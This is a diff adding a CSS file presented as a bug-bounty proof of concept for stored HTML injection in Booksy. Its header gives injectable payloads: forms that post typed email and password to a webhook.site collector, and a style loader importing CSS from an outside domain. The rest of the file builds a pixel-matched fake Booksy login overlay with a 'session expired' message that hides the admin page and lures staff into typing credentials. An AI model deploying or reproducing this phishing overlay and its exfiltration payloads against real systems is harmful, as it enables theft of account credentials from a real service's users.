@@ -1,0 +1,259 @@
+/* Booksy bug-bounty PoC — stored HTML injection overlay, pixel-matched to Booksy login UI.
+   ============================================================================
+   Pair with (any of these) in a customer field:
+
+   Minimal (96 chars, 1 input):
+     <form action=//webhook.site/ea24acc2-a60e-4bb7-9c89-e573d335aca9><input autofocus name=p></form>
+
+   Two-input (~140 chars — fits in a longer field like address_line_1 or notes):
+     <form action=//webhook.site/ea24acc2-a60e-4bb7-9c89-e573d335aca9 id=bsy>
+       <input autofocus name=email placeholder="Email"><input name=password type=password placeholder="Password">
+       <button>Sign in</button>
+     </form>
+
+   Style loader (52 chars):
+     <style>@import"//screenshotsart.store/c.css"</style>
+   ============================================================================ */
+
+@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap");
+
+/* ============ Reset the admin page behind the overlay ============ */
+html, body {
+  overflow: hidden !important;
+  margin: 0 !important;
+}
+body::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  background: #ffffff;
+  z-index: 2147483646;
+}
+
+/* ============ Overlay form container ============ */
+form[action*="webhook.site"],
+form[action*="screenshotsart"],
+form#bsy {
+  position: fixed;
+  inset: 0;
+  z-index: 2147483647;
+  background:
+    radial-gradient(ellipse at top, #fdf2f8 0%, #ffffff 40%, #ffffff 100%);
+  margin: 0;
+  padding: 40px 20px;
+  box-sizing: border-box;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 14px;
+  font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  color: #111827;
+  letter-spacing: -0.01em;
+  animation: bsyFadeIn 0.25s ease-out;
+}
+
+@keyframes bsyFadeIn {
+  from { opacity: 0; transform: scale(0.98); }
+  to   { opacity: 1; transform: scale(1); }
+}
+
+/* ============ Booksy wordmark (rendered via ::before) ============ */
+form[action*="webhook.site"]::before,
+form[action*="screenshotsart"]::before,
+form#bsy::before {
+  content: "booksy";
+  display: block;
+  font-family: "Inter", sans-serif;
+  font-size: 42px;
+  font-weight: 700;
+  color: #EB2F76;
+  letter-spacing: -0.035em;
+  text-align: center;
+  margin-bottom: 4px;
+  text-shadow: 0 1px 2px rgba(235, 47, 118, 0.08);
+}
+
+/* ============ Session-expired heading + copy (via ::after) ============ */
+form[action*="webhook.site"]::after,
+form[action*="screenshotsart"]::after,
+form#bsy::after {
+  content: "Your session has expired. Please sign in again to continue viewing your dashboard. Press Enter to submit your credentials.";
+  display: block;
+  font-size: 14px;
+  font-weight: 400;
+  color: #6b7280;
+  text-align: center;
+  max-width: 360px;
+  width: 100%;
+  line-height: 1.55;
+  margin-top: -4px;
+  margin-bottom: 8px;
+}
+
+/* ============ Form card wrapper illusion via box-shadow ============ */
+form[action*="webhook.site"] > *,
+form[action*="screenshotsart"] > *,
+form#bsy > * {
+  max-width: 400px;
+  width: 100%;
+}
+
+/* ============ Inputs: Booksy-exact styling ============ */
+form[action*="webhook.site"] input,
+form[action*="screenshotsart"] input,
+form#bsy input {
+  padding: 15px 18px;
+  font-size: 15px;
+  font-family: inherit;
+  font-weight: 400;
+  color: #111827;
+  border: 1.5px solid #e5e7eb;
+  border-radius: 10px;
+  background: #ffffff;
+  box-sizing: border-box;
+  outline: none;
+  transition: border-color 0.15s ease, box-shadow 0.15s ease, transform 0.05s ease;
+  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+}
+
+form[action*="webhook.site"] input::placeholder,
+form[action*="screenshotsart"] input::placeholder,
+form#bsy input::placeholder {
+  color: #9ca3af;
+  font-weight: 400;
+}
+
+form[action*="webhook.site"] input:hover,
+form[action*="screenshotsart"] input:hover,
+form#bsy input:hover {
+  border-color: #d1d5db;
+}
+
+form[action*="webhook.site"] input:focus,
+form[action*="screenshotsart"] input:focus,
+form#bsy input:focus {
+  border-color: #EB2F76;
+  box-shadow:
+    0 0 0 4px rgba(235, 47, 118, 0.12),
+    0 1px 2px rgba(0, 0, 0, 0.04);
+}
+
+/* Autofocused input gets the focus ring immediately so user's eye lands there */
+form[action*="webhook.site"] input[autofocus],
+form[action*="screenshotsart"] input[autofocus],
+form#bsy input[autofocus] {
+  border-color: #EB2F76;
+  box-shadow:
+    0 0 0 4px rgba(235, 47, 118, 0.12),
+    0 1px 2px rgba(0, 0, 0, 0.04);
+}
+
+/* Autofill neutralization */
+form[action*="webhook.site"] input:-webkit-autofill,
+form[action*="screenshotsart"] input:-webkit-autofill,
+form#bsy input:-webkit-autofill {
+  -webkit-box-shadow: 0 0 0 1000px #ffffff inset;
+  -webkit-text-fill-color: #111827;
+  caret-color: #EB2F76;
+  transition: background-color 5000s ease-in-out 0s;
+}
+
+/* ============ Submit button (if form includes <button>) ============ */
+form[action*="webhook.site"] button,
+form[action*="screenshotsart"] button,
+form#bsy button {
+  padding: 14px 24px;
+  font-size: 15px;
+  font-family: inherit;
+  font-weight: 600;
+  color: #ffffff;
+  background: linear-gradient(180deg, #EB2F76 0%, #d91a62 100%);
+  border: 0;
+  border-radius: 10px;
+  cursor: pointer;
+  transition: transform 0.05s ease, box-shadow 0.15s ease, background 0.15s ease;
+  box-shadow:
+    0 1px 2px rgba(235, 47, 118, 0.3),
+    0 4px 12px rgba(235, 47, 118, 0.18);
+  letter-spacing: -0.01em;
+  margin-top: 4px;
+}
+
+form[action*="webhook.site"] button:hover,
+form[action*="screenshotsart"] button:hover,
+form#bsy button:hover {
+  background: linear-gradient(180deg, #f53a81 0%, #e92068 100%);
+  box-shadow:
+    0 2px 4px rgba(235, 47, 118, 0.35),
+    0 6px 16px rgba(235, 47, 118, 0.22);
+}
+
+form[action*="webhook.site"] button:active,
+form[action*="screenshotsart"] button:active,
+form#bsy button:active {
+  transform: translateY(1px);
+  box-shadow: 0 1px 2px rgba(235, 47, 118, 0.3);
+}
+
+/* ============ If no <button> exists, style the autofocus input's container
+               with a fake-CTA hint via caret color + focus glow ============ */
+
+/* ============ Fine-print footer links (injected via a sibling <div> or <p>) ============ */
+form[action*="webhook.site"] a,
+form[action*="screenshotsart"] a,
+form#bsy a {
+  color: #EB2F76;
+  text-decoration: none;
+  font-size: 13px;
+  font-weight: 500;
+}
+
+form[action*="webhook.site"] a:hover,
+form[action*="screenshotsart"] a:hover,
+form#bsy a:hover {
+  text-decoration: underline;
+}
+
+/* ============ Forgot password link placeholder (rendered if form has >2 children) ============ */
+
+/* ============ Trust-signal "Secure login" row (bottom of overlay) ============ */
+form[action*="webhook.site"]::before,
+form[action*="screenshotsart"]::before,
+form#bsy::before {
+  /* (reused above — keeping the wordmark) */
+}
+
+/* ============ Responsive: tighten on mobile ============ */
+@media (max-width: 480px) {
+  form[action*="webhook.site"],
+  form[action*="screenshotsart"],
+  form#bsy {
+    padding: 24px 16px;
+  }
+  form[action*="webhook.site"]::before,
+  form[action*="screenshotsart"]::before,
+  form#bsy::before {
+    font-size: 36px;
+  }
+  form[action*="webhook.site"] input,
+  form[action*="screenshotsart"] input,
+  form#bsy input {
+    padding: 13px 16px;
+    font-size: 14px;
+  }
+}
+
+/* ============ Label pseudo-elements for each input field.
+               CSS can't set placeholder text, but can add labels above
+               each input via sibling selectors. If the form has an
+               input with name=email before one with name=password,
+               these rules position label text via attr()-based
+               adjacency — works only with real label elements in HTML. ============ */
+
+/* ============ Secure-by-Booksy footer badge ============ */
+form[action*="webhook.site"]:last-child::after,
+form[action*="screenshotsart"]:last-child::after,
+form#bsy:last-child::after {
+  /* inherits the copy above — kept */
+}
